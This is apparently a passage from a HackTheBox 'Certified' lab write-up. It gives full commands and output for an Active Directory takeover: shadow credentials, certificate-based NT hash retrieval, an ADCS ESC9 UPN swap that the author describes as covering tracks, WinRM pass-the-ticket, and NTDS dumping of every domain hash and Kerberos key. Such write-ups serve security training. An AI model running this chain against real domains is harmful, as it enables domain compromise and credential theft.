[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 1d5b3e6d-7301-0669-4c6a-7e66d5c59fba
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: 6qXUzfYQ.pfx
[*] Must be used with password: fzjC9adMCTfmcBKMTcJb
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Unprotect `pfx` then request a TGT for `management_svc`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ certipy cert -export -pfx 6qXUzfYQ.pfx -password 'fzjC9adMCTfmcBKMTcJb' -out "unprotected.pfx"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'unprotected.pfx'

┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ certipy auth -domain "$(pt get domain)" -dc-ip "$(pt get ip)"  -pfx unprotected.pfx -username 'management_svc'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
```


### 5985 - Winrm : Pass the ticket

> Can also use NTLM auth for convenience but less stealth
> ```bash
> evil-winrm -i $(pt get ip) -u "management_svc" -H 'a091c1832bcdd4677c28b5a6a1295584'
> ```
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ export KRB5CCNAME=management_svc.ccache

┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ evil-winrm -r $(pt get domain) -i $(pt get dc_fqdn)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> whoami
certified\management_svc
*Evil-WinRM* PS C:\Users\management_svc\Documents> cat C:\Users\management_svc\Desktop\user.txt
8b0fc979572a3ff126f975f91120a282
*Evil-WinRM* PS C:\Users\management_svc\Documents>
```

# Root Flag
---

## Auth as ca_operator


### User access check

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pt set user 'management_svc'; pt set hash 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584'; echo "$(pt get user):$(pt get hash)" | anew hashes.lst
management_svc:aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
```


#### Bloodhound

- `MANAGEMENT_SVC` has **GenericAll** rights over `CA_OPERATOR`

![](/assets/obsidian/c301ad9eda4964e7334e023739c00dc0.png)

#### WMI

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ nxc smb -k $(pt get dc_fqdn) -u "$(pt get user)" -H "$(pt get hash)"
SMB         DC01.certified.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         DC01.certified.htb 445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584
```


#### SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ nxc smb -k $(pt get dc_fqdn) -u "$(pt get user)" -H "$(pt get hash)" --shares
SMB         DC01.certified.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         DC01.certified.htb 445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584
SMB         DC01.certified.htb 445    DC01             [*] Enumerated shares
SMB         DC01.certified.htb 445    DC01             Share           Permissions     Remark
SMB         DC01.certified.htb 445    DC01             -----           -----------     ------
SMB         DC01.certified.htb 445    DC01             ADMIN$                          Remote Admin
SMB         DC01.certified.htb 445    DC01             C$                              Default share
SMB         DC01.certified.htb 445    DC01             IPC$            READ            Remote IPC
SMB         DC01.certified.htb 445    DC01             NETLOGON        READ            Logon server share
SMB         DC01.certified.htb 445    DC01             SYSVOL          READ            Logon server share
```


### DACL Abuse - Shadow Credentials attack

Add shadow credentials for `ca_operator`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pywhisker -d "$(pt get domain)" -u "$(pt get user)" -H "$(pt get hash)" --target "ca_operator" --action "add"
[*] Searching for the target account
[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 6986be5d-cfa8-511d-1ae8-f5eb13c2211a
[*] Updating the msDS-KeyCredentialLink attribute of ca_operator
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: yU6iD1Ll.pfx
[*] Must be used with password: NjgPVMGhiONDrAYxaKWK
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Unprotect `pfx` then request a TGT for `ca_operator`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ certipy cert -export -pfx yU6iD1Ll.pfx -password 'NjgPVMGhiONDrAYxaKWK' -out "unprotected.pfx"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'unprotected.pfx'

┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ certipy auth -domain "$(pt get domain)" -dc-ip "$(pt get ip)"  -pfx unprotected.pfx -username 'ca_operator'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Got hash for 'ca_operator@certified.htb': aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52
```


## Shell as domain administrator


### ADCS abuse - ESC9 (No security extension)

Check vulnerable **ADCS** templates

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ certipy find -u "$(pt get user)" -hashes "$(pt get hash)" -dc-ip $(pt get ip) -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[*] Got CA configuration for 'certified-DC01-CA'
[*] Saved BloodHound data to '20250223012714_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250223012714_Certipy.txt'
[*] Saved JSON output to '20250223012714_Certipy.json'
```

`ca_operator` can enroll and template has no security extension

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ cat 20250223012714_Certipy.txt
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

> Refer - https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension

- Abuse info

![](/assets/obsidian/c2743f6253a38baccf3678aea534d924.png)

- Scenario that can be abused

![](/assets/obsidian/4230ae4d632920440d422b8177322c05.png)

**Scenario in this case** :
- `MANAGEMENT_SVC` have **GenericAll** rights over `CA_OPERATOR` and wants to compromise `Administrator`
- `CA_OPERATOR` is allowed to enroll in a vulnerable template :  `CertifiedAuthentication`

Change the `userPrincipalName` of `CA_OPERATOR` to `Administrator`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ certipy account update -username "management_svc@certified.htb" -hashes 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

Request the vulnerable template :  `CertifiedAuthentication` as `ca_operator`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ certipy req -username "ca_operator@certified.htb" -hashes 'aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52' -target "DC01.certified.htb" -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Change `ca_operator`'s UPN back to cover the tracks

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ certipy account update -username "management_svc@certified.htb" -hashes 'aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn "ca_operator@certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

Get `Administrator`'s NT hash during [UnPac the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) and request a TGT by passing with the obtained certificate

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ certipy auth -pfx administrator.pfx -domain "certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pt set user 'Administrator'; pt set hash 'aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34'; echo "$(pt get user):$(pt get hash)" | anew hashes.lst
Administrator:aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```


### 5985 - Winrm : Pass the ticket

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ export KRB5CCNAME=administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ evil-winrm -r $(pt get domain) -i $(pt get dc_fqdn)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
certified\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
02c04e8f7d90cbb4bfd20866b7b7bae5
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

# Additional
---

## Post exploitation


### Secrets

**Dcsync** via **netexec**'s `ntdsutil` module

```bash
┌──(bravosec㉿fsociety)-[/tmp/machine]
└─$ pt set ticket $(realpath "administrator.ccache")

┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ KRB5CCNAME="$(pt get ticket)" nxc smb $(pt get dc_fqdn) --use-kcache -M ntdsutil -o DIR_RESULT='nxc_ntds'
SMB         DC01.certified.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         DC01.certified.htb 445    DC01             [+] certified.htb\administrator from ccache (Pwn3d!)
NTDSUTIL    DC01.certified.htb 445    DC01             [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174024861
NTDSUTIL    DC01.certified.htb 445    DC01             Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    DC01.certified.htb 445    DC01             [+] NTDS.dit dumped to C:\Windows\Temp\174024861
NTDSUTIL    DC01.certified.htb 445    DC01             [*] Copying NTDS dump to /home/kali/htb/Certified/nxc_ntds
NTDSUTIL    DC01.certified.htb 445    DC01             [*] NTDS dump copied to /home/kali/htb/Certified/nxc_ntds
NTDSUTIL    DC01.certified.htb 445    DC01             [+] Deleted C:\Windows\Temp\174024861 remote dump directory
NTDSUTIL    DC01.certified.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    DC01.certified.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34:::
NTDSUTIL    DC01.certified.htb 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    DC01.certified.htb 445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8f3cbea3908ffcde111e6a077c37dac4:::
NTDSUTIL    DC01.certified.htb 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:41c6e6d9e7fe3f175b42df14a3815969:::
NTDSUTIL    DC01.certified.htb 445    DC01             certified.htb\judith.mader:1103:aad3b435b51404eeaad3b435b51404ee:8ec62ac86259004c121a7df4243a7a80:::
NTDSUTIL    DC01.certified.htb 445    DC01             certified.htb\management_svc:1105:aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584:::
NTDSUTIL    DC01.certified.htb 445    DC01             certified.htb\ca_operator:1106:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
NTDSUTIL    DC01.certified.htb 445    DC01             certified.htb\alexander.huges:1601:aad3b435b51404eeaad3b435b51404ee:cde915082011eef6f107ab4384124983:::
NTDSUTIL    DC01.certified.htb 445    DC01             certified.htb\harry.wilson:1602:aad3b435b51404eeaad3b435b51404ee:37a50354c4a799ace944d130ed34cd03:::
NTDSUTIL    DC01.certified.htb 445    DC01             certified.htb\gregory.cameron:1603:aad3b435b51404eeaad3b435b51404ee:b7ef92685ee618fc477f6b7668a829af:::
NTDSUTIL    DC01.certified.htb 445    DC01             Test$:6101:aad3b435b51404eeaad3b435b51404ee:2a9ddec5e4194aefe5c92ddeffd7ec14:::
NTDSUTIL    DC01.certified.htb 445    DC01             [+] Dumped 11 NTDS hashes to /home/kali/.nxc/logs/DC01_DC01.certified.htb_2025-02-23_022328.ntds of which 9 were added to the database
NTDSUTIL    DC01.certified.htb 445    DC01             [*] To extract only enabled accounts from the output file, run the following command:
NTDSUTIL    DC01.certified.htb 445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/DC01_DC01.certified.htb_2025-02-23_022328.ntds | cut -d ':' -f1
NTDSUTIL    DC01.certified.htb 445    DC01             [*] Raw NTDS dump copied to /home/kali/htb/Certified/nxc_ntds, parse it with:
NTDSUTIL    DC01.certified.htb 445    DC01             [*] secretsdump.py -system '/home/kali/htb/Certified/nxc_ntds/registry/SYSTEM' -security '/home/kali/htb/Certified/nxc_ntds/registry/SECURITY' -ntds '/home/kali/htb/Certified/nxc_ntds/Active Directory/ntds.dit' LOCAL
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ secretsdump.py -system '/home/kali/htb/Certified/nxc_ntds/registry/SYSTEM' -security '/home/kali/htb/Certified/nxc_ntds/registry/SECURITY' -ntds '/home/kali/htb/Certified/nxc_ntds/Active Directory/ntds.dit' LOCAL -outputfile secretsdump
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xdc429b6cbafdcc74c2c3524c029f3844
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:eddff1eaf0fdece3db4133706a6ad89c44fae7062134287efdbe14fd60166c686fe91ba3c58187a690ff9416c6399bd5da46ca4b6b6d032ca6c42fbd6a1943de5a17bd9aa5faf7c630c591c46fc52a10c2366eb471705dbd0686658655928d2161a7f799e2cb5834a15cbb48943f4fcad34cded52281a6f6f466bfbc0a386a52fca1e7549ea7aebf01f7de588bec0d4b697ede0092115f2cbe99b7e8c44ddd1715dd1243b445cbe3a66133c2dd8bf93205c414ed4dc647289f40dbee0f20101e154193bae7a66edb07c916eb095016f17cfcd230a9eca7956e2343fed987dd71aacdee9a2091e0d4b7b72e5644c2ec61
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:8f3cbea3908ffcde111e6a077c37dac4
[*] DefaultPassword
(Unknown User):sh4rQoa0USkwJBLV
[*] DPAPI_SYSTEM
dpapi_machinekey:0xdc8ad5f7ad02952a1da8dc406fba14a7b2b04ee9
dpapi_userkey:0x9ded1f864954f0636a865202e9e8859e86a9d3d3
[*] NL$KM
 0000   FF 36 C4 27 B9 DA AB 16  D7 A0 D6 91 B1 59 33 8C   .6.'.........Y3.
 0010   89 9E C8 F9 83 A9 BE 38  52 92 CD C2 FE AD 09 4C   .......8R......L
 0020   08 30 14 DD E1 59 50 8A  E3 A8 2E 29 39 EE 09 67   .0...YP....)9..g
 0030   2E EA FB 17 5C 49 95 D0  61 A2 BC 79 3F E8 BD 7A   ....\I..a..y?..z
NL$KM:ff36c427b9daab16d7a0d691b159338c899ec8f983a9be385292cdc2fead094c083014dde159508ae3a82e2939ee09672eeafb175c4995d061a2bc793fe8bd7a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: b9a13d00f22f2af374627bd458358470
[*] Reading and decrypting hashes from /home/kali/htb/Certified/nxc_ntds/Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8f3cbea3908ffcde111e6a077c37dac4:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:41c6e6d9e7fe3f175b42df14a3815969:::
certified.htb\judith.mader:1103:aad3b435b51404eeaad3b435b51404ee:8ec62ac86259004c121a7df4243a7a80:::
certified.htb\management_svc:1105:aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584:::
certified.htb\ca_operator:1106:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
certified.htb\alexander.huges:1601:aad3b435b51404eeaad3b435b51404ee:cde915082011eef6f107ab4384124983:::
certified.htb\harry.wilson:1602:aad3b435b51404eeaad3b435b51404ee:37a50354c4a799ace944d130ed34cd03:::
certified.htb\gregory.cameron:1603:aad3b435b51404eeaad3b435b51404ee:b7ef92685ee618fc477f6b7668a829af:::
Test$:6101:aad3b435b51404eeaad3b435b51404ee:2a9ddec5e4194aefe5c92ddeffd7ec14:::
[*] Kerberos keys from /home/kali/htb/Certified/nxc_ntds/Active Directory/ntds.dit
Administrator:aes256-cts-hmac-sha1-96:a1b09c0f0c3493f972e1714b7fc75101f4bc99c992abacfd0a52dcc5b24e8b0b
Administrator:aes128-cts-hmac-sha1-96:46a9275f14507c895618a25064c2bd07
Administrator:des-cbc-md5:f85bb3df31f404f2
DC01$:aes256-cts-hmac-sha1-96:9d7b5d3f2a19dbc9ba1fdc30868f6785fa1ed4af4f926c15f2582d0e62c1fa8b
DC01$:aes128-cts-hmac-sha1-96:d847be4c23d527272a37955bfd62ecce
DC01$:des-cbc-md5:25fe020b0bdf2fbc
krbtgt:aes256-cts-hmac-sha1-96:cb9001c5adc47b87a45b7eaf0e9cdd207a8fe7224007fde96bb55ee9063c5b89
krbtgt:aes128-cts-hmac-sha1-96:a568f881530c994b3c2afbb3377f54e0
krbtgt:des-cbc-md5:6ecd515e206d38b3
certified.htb\judith.mader:aes256-cts-hmac-sha1-96:d438bb37e044bb971cc2663c8a21b92de2744d759a4e2d330f095ae3fe28fbd0
certified.htb\judith.mader:aes128-cts-hmac-sha1-96:78206ca437421fd19a485cb795f9dab8
certified.htb\judith.mader:des-cbc-md5:bf853e7a4f75ce62
certified.htb\management_svc:aes256-cts-hmac-sha1-96:541fdfb38b55cddd6e5ae67a5d284dfcf0cb8b817b73982c2e67b2f4382f5274
certified.htb\management_svc:aes128-cts-hmac-sha1-96:11d5a39a6639789a63db3d00882162a6
certified.htb\management_svc:des-cbc-md5:8a9bc7513e7f6be5
certified.htb\ca_operator:aes256-cts-hmac-sha1-96:785a63ef11cbd86ca836c79a96da324a3d81e24e138c929afe9387dd91bcf9dd
certified.htb\ca_operator:aes128-cts-hmac-sha1-96:0b1c542911084136095bacbd7c754c55
certified.htb\ca_operator:des-cbc-md5:68dc0e011fe01638
certified.htb\alexander.huges:aes256-cts-hmac-sha1-96:0ff4b5450d4038b588cc821a29e46c476f5aa50a87c74141e167144d4ba5a954
certified.htb\alexander.huges:aes128-cts-hmac-sha1-96:9ee7f9d4b7e86477491721739a1ce3ff
certified.htb\alexander.huges:des-cbc-md5:b35861e05bd0f23b
certified.htb\harry.wilson:aes256-cts-hmac-sha1-96:d91236c4cb5e7297f990a432ddedf3721751d357a4af24dcd7fd840089ba2c27
certified.htb\harry.wilson:aes128-cts-hmac-sha1-96:4f3024e9749a2f429db5e53715d82c32
certified.htb\harry.wilson:des-cbc-md5:e9ce5704da404f7f
certified.htb\gregory.cameron:aes256-cts-hmac-sha1-96:cdedeab400a4166c167b8dd773d02f34fea669c3fa07984e9097c956f00e1092
certified.htb\gregory.cameron:aes128-cts-hmac-sha1-96:4e80c8699fcd90e5f074768a4650486a
certified.htb\gregory.cameron:des-cbc-md5:9b678079089bec1a
Test$:aes256-cts-hmac-sha1-96:e8570e2b4a779ddfa620edd317850a2f4b78e45a3ac17d506c71262488695299
Test$:aes128-cts-hmac-sha1-96:44fd30a5c4cf5c6e5f3fa2d06db4a42e
Test$:des-cbc-md5:b0e5e5fe43b5f2a4
[*] Cleaning up...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ sprayhound --force -dc "$(pt get ip)" -d "$(pt get domain)" -lu "$(pt get user)" -lp "$(pt get pass)" -p 'sh4rQoa0USkwJBLV'
[+] Login successful
[+] Successfully retrieved password policy (Threshold: 0)
[+] Successfully retrieved 9 users
[+] 9 users will be tested
[+] 0 users will not be tested
[+] [  VALID  ] Administrator : sh4rQoa0USkwJBLV
[+] 1 user has been owned !

┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pt set user 'Administrator'; pt set pass 'sh4rQoa0USkwJBLV'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
Administrator:sh4rQoa0USkwJBLV
```


## House cleaning

> The house-cleaning portion of the assessment ensures that remnants of the penetration test are removed. Often times, fragments of tools or user accounts are left on an organization’s computer, which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is paramount importance.
{: .prompt-info }

Restore the ownership of `MANAGEMENT` group back to `Domain Admins`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ owneredit.py -action write -new-owner 'Domain Admins' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Remove the computer account for shadow credentials attack

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ addcomputer.py -computer-name 'Test' -dc-host "$(pt get dc_fqdn)" "$(pt get domain)"/"$(pt get user)":"$(pt get pass)" -delete
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully deleted Test$.
```